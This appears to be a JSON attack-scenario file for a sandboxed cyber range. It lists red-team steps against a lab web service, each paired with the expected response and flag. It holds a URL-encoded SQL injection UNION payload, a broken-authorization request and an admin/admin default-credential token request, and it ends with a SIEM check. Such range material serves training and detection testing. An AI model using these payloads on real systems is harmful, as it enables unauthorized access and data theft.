{
  "actor": "sandbox-red",
  "base_url": "http://svc-web.openrange-dmz.svc.cluster.local:8080",
  "steps": [
    {
      "action": "discover",
      "method": "GET",
      "path": "/robots.txt",
      "expect": "Disallow"
    },
    {
      "action": "enumerate_api",
      "method": "GET",
      "path": "/openapi.json",
      "expect": "/search"
    },
    {
      "action": "initial_access",
      "weakness": "sql_injection",
      "method": "GET",
      "path": "/search?q=%27%20UNION%20SELECT%20flag%20--%20&asset=finance_docs",
      "expect": "ORANGE{"
    },
    {
      "action": "collect_admin_record",
      "weakness": "broken_authorization",
      "method": "GET",
      "path": "/records?record=admin-console",
      "expect": "ORANGE{"
    },
    {
      "action": "obtain_idp_token",
      "weakness": "default_credential",
      "method": "GET",
      "path": "/idp/token?username=admin&password=admin",
      "expect": "or-idp-admin-session"
    },
    {
      "action": "review_siem",
      "method": "GET",
      "path": "/siem/events",
      "expect": "InitialAccess"
    }
  ]
}
